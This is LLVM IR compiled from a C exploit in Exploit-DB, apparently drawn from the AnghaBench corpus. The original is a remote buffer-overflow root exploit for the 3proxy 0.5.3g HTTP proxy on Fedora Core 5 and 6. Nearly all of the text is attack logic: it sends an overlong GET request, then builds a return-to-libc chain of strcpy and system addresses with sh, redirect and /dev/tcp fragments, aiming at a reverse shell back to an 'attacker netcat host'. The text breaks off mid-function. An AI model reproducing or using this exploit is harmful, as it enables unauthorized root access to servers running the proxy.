; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3829.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3829.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [135 x i8] c"/*\0A**\0A** Fedora Core 5,6 (exec-shield) based\0A** 3proxy HTTP Proxy (3proxy-0.5.3g.tgz) remote overflow root exploit\0A** by Xpl017Elz\0A**\0A\00", align 1
@.str.1 = private unnamed_addr constant [49 x i8] c"** Usage: %s [host] [port] [attacker ip] [type]\0A\00", align 1
@.str.2 = private unnamed_addr constant [38 x i8] c"**\0A** host: 3proxy HTTP Proxy server\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"** port: default 3128\0A\00", align 1
@.str.4 = private unnamed_addr constant [38 x i8] c"** attacker ip: attacker netcat host\0A\00", align 1
@.str.5 = private unnamed_addr constant [79 x i8] c"** type: {0} - Fedora Core release 5 (Bordeaux), exec-shield default enabled.\0A\00", align 1
@.str.6 = private unnamed_addr constant [77 x i8] c"**       {1} - Fedora Core release 6 (Zod), exec-shield default enabled.\0A**\0A\00", align 1
@.str.7 = private unnamed_addr constant [63 x i8] c"** Example: %s 3proxy.use_host.co.kr 3128 82.82.82.82 1\0A**\0A*/\0A\00", align 1
@FC6_STRCPY_PLT = common dso_local global i32 0, align 4
@FC6_MOVE_ESP = common dso_local global i32 0, align 4
@FC6_CMD_LOC = common dso_local global i32 0, align 4
@FC6_NULL_STR = common dso_local global i32 0, align 4
@FC6_NUM = common dso_local global i32 0, align 4
@FC6_SH_STR = common dso_local global i32 0, align 4
@FC6_REDIR_1 = common dso_local global i32 0, align 4
@FC6_REDIR_2 = common dso_local global i32 0, align 4
@FC6_SLASH_STR = common dso_local global i32 0, align 4
@FC6_DEV_STR1 = common dso_local global i32 0, align 4
@FC6_DEV_STR2 = common dso_local global i32 0, align 4
@FC6_TCP_STR1 = common dso_local global i32 0, align 4
@FC6_TCP_STR2 = common dso_local global i32 0, align 4
@FC6_PORT_56789 = common dso_local global i32 0, align 4
@FC6_SYSTEM_PLT = common dso_local global i32 0, align 4
@FC5_STRCPY_PLT = common dso_local global i32 0, align 4
@FC5_MOVE_ESP = common dso_local global i32 0, align 4
@FC5_CMD_LOC = common dso_local global i32 0, align 4
@FC5_NULL_STR = common dso_local global i32 0, align 4
@FC5_NUM = common dso_local global i32 0, align 4
@FC5_SH_STR = common dso_local global i32 0, align 4
@FC5_REDIR_1 = common dso_local global i32 0, align 4
@FC5_REDIR_2 = common dso_local global i32 0, align 4
@FC5_SLASH_STR = common dso_local global i32 0, align 4
@FC5_DEV_STR1 = common dso_local global i32 0, align 4
@FC5_DEV_STR2 = common dso_local global i32 0, align 4
@FC5_TCP_STR1 = common dso_local global i32 0, align 4
@FC5_TCP_STR2 = common dso_local global i32 0, align 4
@FC5_PORT_56789 = common dso_local global i32 0, align 4
@FC5_SYSTEM_PLT = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"%10lu\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"** gethostbyname() error\0A**\0A*/\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [25 x i8] c"** socket() error\0A**\0A*/\0A\00", align 1
@.str.12 = private unnamed_addr constant [17 x i8] c"** make exploit\0A\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"GET /\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"\0AHost: \00", align 1
@.str.16 = private unnamed_addr constant [26 x i8] c"** total packet size: %d\0A\00", align 1
@.str.17 = private unnamed_addr constant [26 x i8] c"** connect() error\0A**\0A*/\0A\00", align 1
@.str.18 = private unnamed_addr constant [17 x i8] c"** send exploit\0A\00", align 1
@.str.19 = private unnamed_addr constant [43 x i8] c"** attacker host, check it up, now!\0A**\0A*/\0A\00", align 1
@IP1 = common dso_local global i32 0, align 4
@IP2 = common dso_local global i32 0, align 4
@IP3 = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.hostent*, align 8
  %22 = alloca %struct.sockaddr_in, align 4
  %23 = alloca [4096 x i8], align 16
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca [256 x i8], align 16
  %33 = alloca [256 x i8], align 16
  %34 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 3128, i32* %34, align 4
  %35 = load i32, i32* %31, align 4
  store i32 %35, i32* %30, align 4
  store i32 %35, i32* %29, align 4
  store i32 %35, i32* %28, align 4
  store i32 %35, i32* %27, align 4
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 0
  %37 = call i32 @memset(i8* %36, i32 0, i32 4096)
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str, i64 0, i64 0))
  %39 = load i32, i32* %4, align 4
  %40 = icmp slt i32 %39, 5
  br i1 %40, label %41, label %56

41:                                               ; preds = %2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.1, i64 0, i64 0), i8* %44)
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.4, i64 0, i64 0))
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.5, i64 0, i64 0))
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.6, i64 0, i64 0))
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 0
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.7, i64 0, i64 0), i8* %53)
  %55 = call i32 @exit(i32 -1) #4
  unreachable

56:                                               ; preds = %2
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 4
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @atoi(i8* %59)
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %78

62:                                               ; preds = %56
  %63 = load i32, i32* @FC6_STRCPY_PLT, align 4
  store i32 %63, i32* %6, align 4
  %64 = load i32, i32* @FC6_MOVE_ESP, align 4
  store i32 %64, i32* %7, align 4
  %65 = load i32, i32* @FC6_CMD_LOC, align 4
  store i32 %65, i32* %8, align 4
  %66 = load i32, i32* @FC6_NULL_STR, align 4
  store i32 %66, i32* %9, align 4
  %67 = load i32, i32* @FC6_NUM, align 4
  store i32 %67, i32* %10, align 4
  %68 = load i32, i32* @FC6_SH_STR, align 4
  store i32 %68, i32* %11, align 4
  %69 = load i32, i32* @FC6_REDIR_1, align 4
  store i32 %69, i32* %12, align 4
  %70 = load i32, i32* @FC6_REDIR_2, align 4
  store i32 %70, i32* %13, align 4
  %71 = load i32, i32* @FC6_SLASH_STR, align 4
  store i32 %71, i32* %14, align 4
  %72 = load i32, i32* @FC6_DEV_STR1, align 4
  store i32 %72, i32* %15, align 4
  %73 = load i32, i32* @FC6_DEV_STR2, align 4
  store i32 %73, i32* %16, align 4
  %74 = load i32, i32* @FC6_TCP_STR1, align 4
  store i32 %74, i32* %17, align 4
  %75 = load i32, i32* @FC6_TCP_STR2, align 4
  store i32 %75, i32* %18, align 4
  %76 = load i32, i32* @FC6_PORT_56789, align 4
  store i32 %76, i32* %19, align 4
  %77 = load i32, i32* @FC6_SYSTEM_PLT, align 4
  store i32 %77, i32* %20, align 4
  br label %94

78:                                               ; preds = %56
  %79 = load i32, i32* @FC5_STRCPY_PLT, align 4
  store i32 %79, i32* %6, align 4
  %80 = load i32, i32* @FC5_MOVE_ESP, align 4
  store i32 %80, i32* %7, align 4
  %81 = load i32, i32* @FC5_CMD_LOC, align 4
  store i32 %81, i32* %8, align 4
  %82 = load i32, i32* @FC5_NULL_STR, align 4
  store i32 %82, i32* %9, align 4
  %83 = load i32, i32* @FC5_NUM, align 4
  store i32 %83, i32* %10, align 4
  %84 = load i32, i32* @FC5_SH_STR, align 4
  store i32 %84, i32* %11, align 4
  %85 = load i32, i32* @FC5_REDIR_1, align 4
  store i32 %85, i32* %12, align 4
  %86 = load i32, i32* @FC5_REDIR_2, align 4
  store i32 %86, i32* %13, align 4
  %87 = load i32, i32* @FC5_SLASH_STR, align 4
  store i32 %87, i32* %14, align 4
  %88 = load i32, i32* @FC5_DEV_STR1, align 4
  store i32 %88, i32* %15, align 4
  %89 = load i32, i32* @FC5_DEV_STR2, align 4
  store i32 %89, i32* %16, align 4
  %90 = load i32, i32* @FC5_TCP_STR1, align 4
  store i32 %90, i32* %17, align 4
  %91 = load i32, i32* @FC5_TCP_STR2, align 4
  store i32 %91, i32* %18, align 4
  %92 = load i32, i32* @FC5_PORT_56789, align 4
  store i32 %92, i32* %19, align 4
  %93 = load i32, i32* @FC5_SYSTEM_PLT, align 4
  store i32 %93, i32* %20, align 4
  br label %94

94:                                               ; preds = %78, %62
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 3
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @sscanf(i8* %97, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0), i32* %28, i32* %29, i32* %30, i32* %31)
  store i32 0, i32* %27, align 4
  %99 = load i32, i32* %28, align 4
  %100 = mul nsw i32 %99, 16777216
  %101 = load i32, i32* %27, align 4
  %102 = add nsw i32 %101, %100
  store i32 %102, i32* %27, align 4
  %103 = load i32, i32* %29, align 4
  %104 = mul nsw i32 %103, 65536
  %105 = load i32, i32* %27, align 4
  %106 = add nsw i32 %105, %104
  store i32 %106, i32* %27, align 4
  %107 = load i32, i32* %30, align 4
  %108 = mul nsw i32 %107, 256
  %109 = load i32, i32* %27, align 4
  %110 = add nsw i32 %109, %108
  store i32 %110, i32* %27, align 4
  %111 = load i32, i32* %31, align 4
  %112 = load i32, i32* %27, align 4
  %113 = add nsw i32 %112, %111
  store i32 %113, i32* %27, align 4
  %114 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 0
  %115 = call i32 @memset(i8* %114, i32 0, i32 256)
  %116 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 0
  %117 = load i32, i32* %27, align 4
  %118 = call i32 (i8*, i8*, ...) @sprintf(i8* %116, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i32 %117)
  %119 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i64 0, i64 0
  %120 = call i32 @memset(i8* %119, i32 0, i32 256)
  %121 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i64 0, i64 0
  %122 = load i8**, i8*** %5, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 1
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @strncpy(i8* %121, i8* %124, i32 255)
  %126 = load i8**, i8*** %5, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 2
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128)
  store i32 %129, i32* %34, align 4
  %130 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i64 0, i64 0
  %131 = call %struct.hostent* @gethostbyname(i8* %130)
  store %struct.hostent* %131, %struct.hostent** %21, align 8
  %132 = load %struct.hostent*, %struct.hostent** %21, align 8
  %133 = icmp eq %struct.hostent* %132, null
  br i1 %133, label %134, label %136

134:                                              ; preds = %94
  %135 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %945

136:                                              ; preds = %94
  %137 = load i32, i32* @AF_INET, align 4
  %138 = load i32, i32* @SOCK_STREAM, align 4
  %139 = call i32 @socket(i32 %137, i32 %138, i32 0)
  store i32 %139, i32* %26, align 4
  %140 = load i32, i32* %26, align 4
  %141 = icmp eq i32 %140, -1
  br i1 %141, label %142, label %144

142:                                              ; preds = %136
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.11, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %945

144:                                              ; preds = %136
  %145 = load i32, i32* @AF_INET, align 4
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 3
  store i32 %145, i32* %146, align 4
  %147 = load i32, i32* %34, align 4
  %148 = call i32 @htons(i32 %147)
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 2
  store i32 %148, i32* %149, align 4
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 1
  %151 = load %struct.hostent*, %struct.hostent** %21, align 8
  %152 = getelementptr inbounds %struct.hostent, %struct.hostent* %151, i32 0, i32 0
  %153 = load i64, i64* %152, align 8
  %154 = inttoptr i64 %153 to %struct.in_addr*
  %155 = bitcast %struct.in_addr* %150 to i8*
  %156 = bitcast %struct.in_addr* %154 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %155, i8* align 4 %156, i64 4, i1 false)
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %22, i32 0, i32 0
  %158 = call i32 @bzero(i32* %157, i32 8)
  %159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.12, i64 0, i64 0))
  %160 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 0
  %161 = call i32 (i8*, i8*, ...) @sprintf(i8* %160, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i64 0, i64 0))
  %162 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 0
  %163 = call i32 @strlen(i8* %162)
  store i32 %163, i32* %25, align 4
  store i32 0, i32* %24, align 4
  br label %164

164:                                              ; preds = %173, %144
  %165 = load i32, i32* %24, align 4
  %166 = icmp slt i32 %165, 1356
  br i1 %166, label %167, label %178

167:                                              ; preds = %164
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 0
  %169 = load i32, i32* %25, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %168, i64 %170
  %172 = call i32 (i8*, i8*, ...) @sprintf(i8* %171, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  br label %173

173:                                              ; preds = %167
  %174 = load i32, i32* %24, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %24, align 4
  %176 = load i32, i32* %25, align 4
  %177 = add nsw i32 %176, 1
  store i32 %177, i32* %25, align 4
  br label %164

178:                                              ; preds = %164
  store i32 0, i32* %25, align 4
  %179 = load i32, i32* %7, align 4
  %180 = sext i32 %179 to i64
  %181 = load i32, i32* %24, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %182
  %184 = bitcast i8* %183 to i64*
  store i64 %180, i64* %184, align 1
  %185 = load i32, i32* %24, align 4
  %186 = add nsw i32 %185, 4
  store i32 %186, i32* %24, align 4
  %187 = load i32, i32* %24, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %188
  %190 = bitcast i8* %189 to i64*
  store i64 218959117, i64* %190, align 1
  %191 = load i32, i32* %24, align 4
  %192 = add nsw i32 %191, 4
  store i32 %192, i32* %24, align 4
  %193 = load i32, i32* %24, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %194
  %196 = bitcast i8* %195 to i64*
  store i64 218959117, i64* %196, align 1
  %197 = load i32, i32* %24, align 4
  %198 = add nsw i32 %197, 4
  store i32 %198, i32* %24, align 4
  %199 = load i32, i32* %6, align 4
  %200 = sext i32 %199 to i64
  %201 = load i32, i32* %24, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %202
  %204 = bitcast i8* %203 to i64*
  store i64 %200, i64* %204, align 1
  %205 = load i32, i32* %24, align 4
  %206 = add nsw i32 %205, 4
  store i32 %206, i32* %24, align 4
  %207 = load i32, i32* %7, align 4
  %208 = sext i32 %207 to i64
  %209 = load i32, i32* %24, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %210
  %212 = bitcast i8* %211 to i64*
  store i64 %208, i64* %212, align 1
  %213 = load i32, i32* %24, align 4
  %214 = add nsw i32 %213, 4
  store i32 %214, i32* %24, align 4
  %215 = load i32, i32* %8, align 4
  %216 = load i32, i32* %25, align 4
  %217 = add nsw i32 %215, %216
  %218 = sext i32 %217 to i64
  %219 = load i32, i32* %24, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %220
  %222 = bitcast i8* %221 to i64*
  store i64 %218, i64* %222, align 1
  %223 = load i32, i32* %24, align 4
  %224 = add nsw i32 %223, 4
  store i32 %224, i32* %24, align 4
  %225 = load i32, i32* %11, align 4
  %226 = sext i32 %225 to i64
  %227 = load i32, i32* %24, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %228
  %230 = bitcast i8* %229 to i64*
  store i64 %226, i64* %230, align 1
  %231 = load i32, i32* %24, align 4
  %232 = add nsw i32 %231, 4
  store i32 %232, i32* %24, align 4
  %233 = load i32, i32* %25, align 4
  %234 = add nsw i32 %233, 2
  store i32 %234, i32* %25, align 4
  %235 = load i32, i32* %6, align 4
  %236 = sext i32 %235 to i64
  %237 = load i32, i32* %24, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %238
  %240 = bitcast i8* %239 to i64*
  store i64 %236, i64* %240, align 1
  %241 = load i32, i32* %24, align 4
  %242 = add nsw i32 %241, 4
  store i32 %242, i32* %24, align 4
  %243 = load i32, i32* %7, align 4
  %244 = sext i32 %243 to i64
  %245 = load i32, i32* %24, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %246
  %248 = bitcast i8* %247 to i64*
  store i64 %244, i64* %248, align 1
  %249 = load i32, i32* %24, align 4
  %250 = add nsw i32 %249, 4
  store i32 %250, i32* %24, align 4
  %251 = load i32, i32* %8, align 4
  %252 = load i32, i32* %25, align 4
  %253 = add nsw i32 %251, %252
  %254 = sext i32 %253 to i64
  %255 = load i32, i32* %24, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %256
  %258 = bitcast i8* %257 to i64*
  store i64 %254, i64* %258, align 1
  %259 = load i32, i32* %24, align 4
  %260 = add nsw i32 %259, 4
  store i32 %260, i32* %24, align 4
  %261 = load i32, i32* %12, align 4
  %262 = sext i32 %261 to i64
  %263 = load i32, i32* %24, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %264
  %266 = bitcast i8* %265 to i64*
  store i64 %262, i64* %266, align 1
  %267 = load i32, i32* %24, align 4
  %268 = add nsw i32 %267, 4
  store i32 %268, i32* %24, align 4
  %269 = load i32, i32* %25, align 4
  %270 = add nsw i32 %269, 1
  store i32 %270, i32* %25, align 4
  %271 = load i32, i32* %6, align 4
  %272 = sext i32 %271 to i64
  %273 = load i32, i32* %24, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %274
  %276 = bitcast i8* %275 to i64*
  store i64 %272, i64* %276, align 1
  %277 = load i32, i32* %24, align 4
  %278 = add nsw i32 %277, 4
  store i32 %278, i32* %24, align 4
  %279 = load i32, i32* %7, align 4
  %280 = sext i32 %279 to i64
  %281 = load i32, i32* %24, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %282
  %284 = bitcast i8* %283 to i64*
  store i64 %280, i64* %284, align 1
  %285 = load i32, i32* %24, align 4
  %286 = add nsw i32 %285, 4
  store i32 %286, i32* %24, align 4
  %287 = load i32, i32* %8, align 4
  %288 = load i32, i32* %25, align 4
  %289 = add nsw i32 %287, %288
  %290 = sext i32 %289 to i64
  %291 = load i32, i32* %24, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %292
  %294 = bitcast i8* %293 to i64*
  store i64 %290, i64* %294, align 1
  %295 = load i32, i32* %24, align 4
  %296 = add nsw i32 %295, 4
  store i32 %296, i32* %24, align 4
  %297 = load i32, i32* %14, align 4
  %298 = sext i32 %297 to i64
  %299 = load i32, i32* %24, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %300
  %302 = bitcast i8* %301 to i64*
  store i64 %298, i64* %302, align 1
  %303 = load i32, i32* %24, align 4
  %304 = add nsw i32 %303, 4
  store i32 %304, i32* %24, align 4
  %305 = load i32, i32* %25, align 4
  %306 = add nsw i32 %305, 1
  store i32 %306, i32* %25, align 4
  %307 = load i32, i32* %6, align 4
  %308 = sext i32 %307 to i64
  %309 = load i32, i32* %24, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %310
  %312 = bitcast i8* %311 to i64*
  store i64 %308, i64* %312, align 1
  %313 = load i32, i32* %24, align 4
  %314 = add nsw i32 %313, 4
  store i32 %314, i32* %24, align 4
  %315 = load i32, i32* %7, align 4
  %316 = sext i32 %315 to i64
  %317 = load i32, i32* %24, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %318
  %320 = bitcast i8* %319 to i64*
  store i64 %316, i64* %320, align 1
  %321 = load i32, i32* %24, align 4
  %322 = add nsw i32 %321, 4
  store i32 %322, i32* %24, align 4
  %323 = load i32, i32* %8, align 4
  %324 = load i32, i32* %25, align 4
  %325 = add nsw i32 %323, %324
  %326 = sext i32 %325 to i64
  %327 = load i32, i32* %24, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %328
  %330 = bitcast i8* %329 to i64*
  store i64 %326, i64* %330, align 1
  %331 = load i32, i32* %24, align 4
  %332 = add nsw i32 %331, 4
  store i32 %332, i32* %24, align 4
  %333 = load i32, i32* %15, align 4
  %334 = sext i32 %333 to i64
  %335 = load i32, i32* %24, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %336
  %338 = bitcast i8* %337 to i64*
  store i64 %334, i64* %338, align 1
  %339 = load i32, i32* %24, align 4
  %340 = add nsw i32 %339, 4
  store i32 %340, i32* %24, align 4
  %341 = load i32, i32* %25, align 4
  %342 = add nsw i32 %341, 2
  store i32 %342, i32* %25, align 4
  %343 = load i32, i32* %6, align 4
  %344 = sext i32 %343 to i64
  %345 = load i32, i32* %24, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %346
  %348 = bitcast i8* %347 to i64*
  store i64 %344, i64* %348, align 1
  %349 = load i32, i32* %24, align 4
  %350 = add nsw i32 %349, 4
  store i32 %350, i32* %24, align 4
  %351 = load i32, i32* %7, align 4
  %352 = sext i32 %351 to i64
  %353 = load i32, i32* %24, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %354
  %356 = bitcast i8* %355 to i64*
  store i64 %352, i64* %356, align 1
  %357 = load i32, i32* %24, align 4
  %358 = add nsw i32 %357, 4
  store i32 %358, i32* %24, align 4
  %359 = load i32, i32* %8, align 4
  %360 = load i32, i32* %25, align 4
  %361 = add nsw i32 %359, %360
  %362 = sext i32 %361 to i64
  %363 = load i32, i32* %24, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %364
  %366 = bitcast i8* %365 to i64*
  store i64 %362, i64* %366, align 1
  %367 = load i32, i32* %24, align 4
  %368 = add nsw i32 %367, 4
  store i32 %368, i32* %24, align 4
  %369 = load i32, i32* %16, align 4
  %370 = sext i32 %369 to i64
  %371 = load i32, i32* %24, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %372
  %374 = bitcast i8* %373 to i64*
  store i64 %370, i64* %374, align 1
  %375 = load i32, i32* %24, align 4
  %376 = add nsw i32 %375, 4
  store i32 %376, i32* %24, align 4
  %377 = load i32, i32* %25, align 4
  %378 = add nsw i32 %377, 1
  store i32 %378, i32* %25, align 4
  %379 = load i32, i32* %6, align 4
  %380 = sext i32 %379 to i64
  %381 = load i32, i32* %24, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %382
  %384 = bitcast i8* %383 to i64*
  store i64 %380, i64* %384, align 1
  %385 = load i32, i32* %24, align 4
  %386 = add nsw i32 %385, 4
  store i32 %386, i32* %24, align 4
  %387 = load i32, i32* %7, align 4
  %388 = sext i32 %387 to i64
  %389 = load i32, i32* %24, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %390
  %392 = bitcast i8* %391 to i64*
  store i64 %388, i64* %392, align 1
  %393 = load i32, i32* %24, align 4
  %394 = add nsw i32 %393, 4
  store i32 %394, i32* %24, align 4
  %395 = load i32, i32* %8, align 4
  %396 = load i32, i32* %25, align 4
  %397 = add nsw i32 %395, %396
  %398 = sext i32 %397 to i64
  %399 = load i32, i32* %24, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %400
  %402 = bitcast i8* %401 to i64*
  store i64 %398, i64* %402, align 1
  %403 = load i32, i32* %24, align 4
  %404 = add nsw i32 %403, 4
  store i32 %404, i32* %24, align 4
  %405 = load i32, i32* %17, align 4
  %406 = sext i32 %405 to i64
  %407 = load i32, i32* %24, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %408
  %410 = bitcast i8* %409 to i64*
  store i64 %406, i64* %410, align 1
  %411 = load i32, i32* %24, align 4
  %412 = add nsw i32 %411, 4
  store i32 %412, i32* %24, align 4
  %413 = load i32, i32* %25, align 4
  %414 = add nsw i32 %413, 2
  store i32 %414, i32* %25, align 4
  %415 = load i32, i32* %6, align 4
  %416 = sext i32 %415 to i64
  %417 = load i32, i32* %24, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %418
  %420 = bitcast i8* %419 to i64*
  store i64 %416, i64* %420, align 1
  %421 = load i32, i32* %24, align 4
  %422 = add nsw i32 %421, 4
  store i32 %422, i32* %24, align 4
  %423 = load i32, i32* %7, align 4
  %424 = sext i32 %423 to i64
  %425 = load i32, i32* %24, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds [4096 x i8], [4096 x i8]* %23, i64 0, i64 %426
  %428 = bitcast i8* %427 to i64*
  store i64 %424, i64* %428, align 1
  %429 = load i32, i32* %24, align 4
  %430 = add nsw i32 %429, 4
  store i32 %430, i32* %24, align 4
  %431 = load i32, i32* %8, align 4
  %432 = load i32, i32* %25, align 4
